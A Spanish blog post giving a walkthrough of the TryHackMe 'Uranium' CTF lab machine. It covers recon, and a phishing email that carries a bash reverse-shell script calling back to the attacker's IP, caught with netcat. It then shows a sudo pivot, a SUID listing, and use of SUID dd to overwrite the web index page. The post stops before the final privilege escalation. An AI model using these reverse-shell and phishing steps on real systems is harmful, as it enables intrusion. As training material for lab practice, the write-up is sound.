<!doctype html><html lang=es>
<head>
<title>
Uranium CTF - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Dificíl hakanbey01    Reconocimiento Como en todos los CTF, ejecutamos YAAS para obtener información sobre la máquina.
__ _____ ___ _____ \ \/ / | / | / ___/ \  / /| | / /| | \__ \  Yet Another Automation Script / / ___ |/ ___ |___/ / Version 1.1 LOCAL /_/_/ |_/_/ |_/____/ -By Lanfran02 (https://github.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/es/posts/uranium_ctf/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/es/posts/uranium_ctf/cover.jpeg">
<meta name=twitter:title content="Uranium CTF - Write Up - Español">
<meta name=twitter:description content="Máquina de nivel difícil en TryHackMe.">
<meta property="og:title" content="Uranium CTF - Write Up - Español">
<meta property="og:description" content="Máquina de nivel difícil en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/es/posts/uranium_ctf/"><meta property="og:image" content="/es/posts/uranium_ctf/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-08-21T13:42:51+02:00">
<meta property="article:modified_time" content="2021-08-21T13:42:51+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/es/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Uranium CTF - Write Up - Español</h1>
<div class=post-meta>
<span class=post-date>
2021-08-21
</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 8 mins lectura</span>
</div>
<span class=post-tags>
<a href=/tags/phising/>#Phising</a>&nbsp;
<a href=/tags/suid/>#SUID</a>&nbsp;
<a href=/tags/nc/>#nc</a>&nbsp;
<a href=/tags/nano/>#nano</a>&nbsp;
<a href=/tags/dd/>#dd</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/es/posts/uranium_ctf/cover.jpeg alt="Uranium CTF - Write Up - Español">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li>
<li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li>
<li><a href=#root>Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Nivel</th>
<th>Creador</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/uranium>Aquí</a></td>
<td>Dificíl</td>
<td><a href=https://tryhackme.com/p/hakanbey01>hakanbey01</a></td>
</tr>
</tbody>
</table>
<h2 id=reconocimiento>Reconocimiento</h2>
<p>Como en todos los CTF, ejecutamos <a href=https://github.com/lanfran02/YAAS>YAAS</a> para obtener información sobre la máquina.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>__  _____    ___   _____
<span style=color:#ae81ff>\ \/</span> /   |  /   | / ___/
 <span style=color:#ae81ff>\ </span> / /| | / /| | <span style=color:#ae81ff>\_</span>_ <span style=color:#ae81ff>\ </span> Yet Another Automation Script
 / / ___ |/ ___ |___/ /  Version 1.1 LOCAL
/_/_/  |_/_/  |_/____/   -By Lanfran02
			 <span style=color:#f92672>(</span>https://github.com/lanfran02/YAAS<span style=color:#f92672>)</span>

 ----------------
|                |
| Final output:  |
|                |
 ----------------
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Tun0 IP             :  10.9.1.53
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Machine IP          :  10.10.193.48
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Created Files       :  Nmap Result <span style=color:#f92672>(</span>nmap_Scan<span style=color:#f92672>)</span>
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Open Port/s         :  22,25,80
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> SSH Server/s found? :  YES
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> FTP Server/s found? :  NO
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Web Server/s found? :  YES
<span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Samba Server found? :  NO
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># Nmap 7.91 scan initiated Sat Aug 21 13:43:15 2021 as: nmap -sS -sV -sC -p 22,25,80 -o nmap_Scan 10.10.193.48</span>
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.193.48
Host is up <span style=color:#f92672>(</span>0.055s latency<span style=color:#f92672>)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>uranium
| Subject Alternative Name: DNS:uranium
| Not valid before: 2021-04-09T21:40:53
|_Not valid after:  2031-04-07T21:40:53
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.29 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
|_http-server-header: Apache/2.4.29 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Site doesn<span style=color:#960050;background-color:#1e0010>&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<span style=color:#75715e># Nmap done at Sat Aug 21 13:43:46 2021 -- 1 IP address (1 host up) scanned in 30.56 seconds</span>
</code></pre></div><p>Entonces, tenemos un servidor <code>smtp</code> en ejecución, un servidor<code> web</code> y un servicio <code>ssh</code> en ejecución.</p>
<p>Pero el creador nos dio una cuenta de Twitter, ¡así que vamos a investigarla también!</p>
<p>Al leer el twitter, obtenemos algo de información &mldr;</p>
<p><img src=recon.png alt=recon></p>
<ol>
<li>Ahora tenemos un dominio y un correo electrónico.</li>
<li>Sabemos que el usuario abre el contenido del correo en su terminal y espera un archivo con el nombre &ldquo;application&rdquo;.</li>
</ol>
<h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2>
<p>¿Qué pasa si enviamos un correo electrónico con una &ldquo;aplicación&rdquo; con una reverse shell?</p>
<p>Puede obtener la shell reverse desde este sitio <a href=https://www.revshells.com/>revshells</a></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ cat application                                                                                                ─╯
<span style=color:#75715e>#!/bin/bash</span>
bash -c <span style=color:#e6db74>&#34;bash -i &gt;&amp; /dev/tcp/10.9.1.53/1337 0&gt;&amp;1&#34;</span>
</code></pre></div><p>¡Enviemos el correo ahora!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ sendEmail -t hakanbey@uranium.thm -f lanfran@mail.com -s 10.10.105.19 -u <span style=color:#e6db74>&#34;Im an exploit :)&#34;</span> -m <span style=color:#e6db74>&#34;Im gonna hack you&#34;</span> -a application -o tls<span style=color:#f92672>=</span>no
Aug <span style=color:#ae81ff>21</span> 12:50:21 parrot sendEmail<span style=color:#f92672>[</span>1992588<span style=color:#f92672>]</span>: Email was sent successfully!
</code></pre></div><p>¡¡Y después de unos segundos obtenemos una shell reversa con el usuario hakanbey!!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>1337</span>                                                                                                                       ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>1337</span> ...
connect to <span style=color:#f92672>[</span>10.9.1.54<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.105.19<span style=color:#f92672>]</span> <span style=color:#ae81ff>48468</span>
bash: cannot set terminal process group <span style=color:#f92672>(</span>1494<span style=color:#f92672>)</span>: Inappropriate ioctl <span style=color:#66d9ef>for</span> device
bash: no job control in this shell
hakanbey@uranium:~$ ls
chat_with_kral4  mail_file  user_1.txt
hakanbey@uranium:~$ cat user_1.txt 
thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</code></pre></div><p>¡Podemos leer la flag del user_1!</p>
<p>Aquí viene la segunda parte del reconocimiento :)</p>
<p>Después de revisar la máquina &mldr;</p>
<p>Tenemos un archivo pcap, así que lo descargué y lo leí con wirehark.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hakanbey@uranium:~$ find / -name *.pcap 2&gt; /dev/null 
/var/log/hakanbey_network_log.pcap
</code></pre></div><p>¡Este es un registro de una comunicación y tenemos una contraseña en texto plano!</p>
<p><img src=password.png alt=password></p>
<p>¡¡Perfecto!! ¡Tenemos la contraseña para iniciar binario del chat dentro del home folder de hakanbey!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hakanbey@uranium:~$ ./chat_with_kral4 
PASSWORD :<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
kral4:hi hakanbey

-&gt;hi
hakanbey:hi
kral4:how are you?

-&gt;fine and you ?
hakanbey:fine and you ?
kral4:what now? did you forgot your password again

-&gt;yes
hakanbey:yes
kral4:okay your password is <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span> don<span style=color:#960050;background-color:#1e0010>&#39;</span>t lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated
hakanbey@uranium:~$ sudo -l 
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> hakanbey: 
Matching Defaults entries <span style=color:#66d9ef>for</span> hakanbey on uranium:
    env_reset,
    secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin<span style=color:#ae81ff>\:</span>/snap/bin

User hakanbey may run the following commands on uranium:
    <span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> /bin/bash
hakanbey@uranium:~$ 
</code></pre></div><p>¡Así que ahora podemos hacer <code>sudo</code> a kral4 y leer la flag user_2!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>hakanbey@uranium:~$ sudo -u kral4 /bin/bash
kral4@uranium:~$ id
uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>kral4<span style=color:#f92672>)</span>
kral4@uranium:~$ cat /home/kral4/user_2.txt 
thm<span style=color:#f92672>{[</span>REDACTED<span style=color:#f92672>]}</span>
</code></pre></div><h2 id=root>Root</h2>
<p>Después de usar <code>LinPeas</code> encontré la carpeta de correo de nuestro usuario, con un correo interesante.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>kral4@uranium:/home/kral4$ cd /var/mail
kral4@uranium:/var/mail$ ls
hakanbey  kral4
kral4@uranium:/var/mail$ cat kral4 
From root@uranium.thm  Sat Apr <span style=color:#ae81ff>24</span> 13:22:02 <span style=color:#ae81ff>2021</span>
Return-Path: &lt;root@uranium.thm&gt;
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id C7533401C2
	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
Message-ID: &lt;841530.943147035-sendEmail@uranium&gt;
From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
Subject: Hi Kral4
Date: Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-992935.514616878&#34;</span>

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878
Content-Type: text/plain;
        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in <span style=color:#66d9ef>case</span> it happens again.

------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878--
</code></pre></div><p>Lo que sabemos hasta ahora, el usuario <code>root</code> envió un correo electrónico a <code>kral4</code> diciendo que &ldquo;si recibimos un ataque de nuevo, le daré <code>SUID</code> al binario <code>nano</code> en su carpeta home&rdquo;.</p>
<p>Después de eso busqué los binarios <code>SUID</code>, y encontré uno muy interesante &mldr;</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>-perm /4000 -type f -exec ls -ld <span style=color:#f92672>{}</span> <span style=color:#ae81ff>\;</span> 2&gt;/dev/null
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>113528</span> Feb  <span style=color:#ae81ff>2</span>  <span style=color:#ae81ff>2021</span> /usr/lib/snapd/snap-confine
-rwsr-xr-- <span style=color:#ae81ff>1</span> root messagebus <span style=color:#ae81ff>42992</span> Jun <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>436552</span> Mar  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> /usr/lib/openssh/ssh-keysign
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>14328</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>10232</span> Mar <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2017</span> /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>100760</span> Nov <span style=color:#ae81ff>23</span>  <span style=color:#ae81ff>2018</span> /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>22520</span> Mar <span style=color:#ae81ff>27</span>  <span style=color:#ae81ff>2019</span> /usr/bin/pkexec
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>75824</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/gpasswd
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>40344</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgrp
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>59640</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/passwd
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newuidmap
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44528</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chsh
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>18448</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /usr/bin/traceroute6.iputils
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>37136</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/newgidmap
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>76496</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /usr/bin/chfn
-rwsr-sr-x <span style=color:#ae81ff>1</span> daemon daemon <span style=color:#ae81ff>51464</span> Feb <span style=color:#ae81ff>20</span>  <span style=color:#ae81ff>2018</span> /usr/bin/at
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>149080</span> Jan <span style=color:#ae81ff>19</span>  <span style=color:#ae81ff>2021</span> /usr/bin/sudo
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>26696</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/umount
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>64424</span> Jun <span style=color:#ae81ff>28</span>  <span style=color:#ae81ff>2019</span> /bin/ping
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>44664</span> Mar <span style=color:#ae81ff>22</span>  <span style=color:#ae81ff>2019</span> /bin/su
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>30800</span> Aug <span style=color:#ae81ff>11</span>  <span style=color:#ae81ff>2016</span> /bin/fusermount
-rwsr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>43088</span> Sep <span style=color:#ae81ff>16</span>  <span style=color:#ae81ff>2020</span> /bin/mount
-rwsr-x--- <span style=color:#ae81ff>1</span> web kral4 <span style=color:#ae81ff>76000</span> Apr <span style=color:#ae81ff>23</span> 10:52 /bin/dd
</code></pre></div><p><code>dd</code> Se usa para escribir datos en archivos, entoncesss&mldr;</p>
<p>Podemos usarlo para modificar la index de la web. Aquí está el link a <a href=https://gtfobins.github.io/gtfobins/dd/>GTFOBins para explotarlo</a>.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>kral4@uranium:/home/kral4$ LFILE<span style=color:#f92672>=</span>/var/www/html/index.html 
kral4@uranium:/home/kral4$ echo <span style=color:#e6db74>&#34;Dumped by lanfran02&#34;</span> | /bin/dd of<span style=color:#f92672>=</span>$LFILE
0+1 records in
0+1 records out
<span style=color:#ae81ff>20</span> bytes copied, 0.000148921 s, <span style=color:#ae81ff>134</span> kB/s
kral4@uranium:/home/kral4$ cat /var/mail/kral4                           
From root@uranium.thm  Sat Apr <span style=color:#ae81ff>24</span> 13:22:02 <span style=color:#ae81ff>2021</span>
Return-Path: &lt;root@uranium.thm&gt;
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id C7533401C2
	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
Message-ID: &lt;841530.943147035-sendEmail@uranium&gt;
From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
Subject: Hi Kral4
Date: Sat, <span style=color:#ae81ff>24</span> Apr <span style=color:#ae81ff>2021</span> 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-992935.514616878&#34;</span>

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878
Content-Type: text/plain;
        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in <span style=color:#66d9ef>case</span> it happens again.

------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-992935.514616878--


From root@uranium.thm  Sat Aug <span style=color:#ae81ff>21</span> 11:25:17 <span style=color:#ae81ff>2021</span>
Return-Path: &lt;root@uranium.thm&gt;
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium <span style=color:#f92672>(</span>localhost <span style=color:#f92672>[</span>127.0.0.1<span style=color:#f92672>])</span>
	by uranium <span style=color:#f92672>(</span>Postfix<span style=color:#f92672>)</span> with ESMTP id A476F401A5
	<span style=color:#66d9ef>for</span> &lt;kral4@uranium.thm&gt;; Sat, <span style=color:#ae81ff>21</span> Aug <span style=color:#ae81ff>2021</span> 11:25:17 +0000 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
Message-ID: &lt;35569.014816673-sendEmail@uranium&gt;
From: <span style=color:#e6db74>&#34;root@uranium.thm&#34;</span> &lt;root@uranium.thm&gt;
To: <span style=color:#e6db74>&#34;kral4@uranium.thm&#34;</span> &lt;kral4@uranium.thm&gt;
Subject: Hi Kral4
Date: Sat, <span style=color:#ae81ff>21</span> Aug <span style=color:#ae81ff>2021</span> 11:25:17 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;----MIME delimiter for sendEmail-939019.459839077&#34;</span>

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-939019.459839077
Content-Type: text/plain;
        charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;iso-8859-1&#34;</span>
Content-Transfer-Encoding: 7bit

I think our index page has been hacked again. You know how to fix it, I am giving authorization.

------MIME delimiter <span style=color:#66d9ef>for</span> sendEmail-939019.459839077--


kral4@uranium:/home/kral4$ ls -la
total <span style=color:#ae81ff>384</span>
drwxr-x--- <span style=color:#ae81ff>3</span> kral4 kral4   <span style=color:#ae81ff>4096</span> Aug <span style=color:#ae81ff>21</span> 11:40 .
drwxr-xr-x <span style=color:#ae81ff>4</span> root  root    <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>23</span> 08:50 ..
lrwxrwxrwx <span style=color:#ae81ff>1</span> root  root       <span style=color:#ae81ff>9</span> Apr <span style=color:#ae81ff>25</span> 11:12 .bash_history -&gt; /dev/null
-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4    <span style=color:#ae81ff>220</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .bash_logout
-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4   <span style=color:#ae81ff>3771</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .bashrc
-rwxr-xr-x <span style=color:#ae81ff>1</span> kral4 kral4 <span style=color:#ae81ff>109960</span> Apr  <span style=color:#ae81ff>9</span> 16:35 chat_with_hakanbey
-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4      <span style=color:#ae81ff>5</span> Apr <span style=color:#ae81ff>23</span> 14:03 .check
drwxrwxr-x <span style=color:#ae81ff>3</span> kral4 kral4   <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>10</span> 00:21 .local
-rwsrwxrwx <span style=color:#ae81ff>1</span> root  root  <span style=color:#ae81ff>245872</span> Aug <span style=color:#ae81ff>21</span> 11:40 nano
-rw-r--r-- <span style=color:#ae81ff>1</span> kral4 kral4    <span style=color:#ae81ff>807</span> Apr  <span style=color:#ae81ff>9</span> 21:55 .profile
-rw-rw-r-- <span style=color:#ae81ff>1</span> kral4 kral4     <span style=color:#ae81ff>38</span> Apr <span style=color:#ae81ff>10</span> 00:21 user_2.txt
You have new mail in /var/mail/kral4
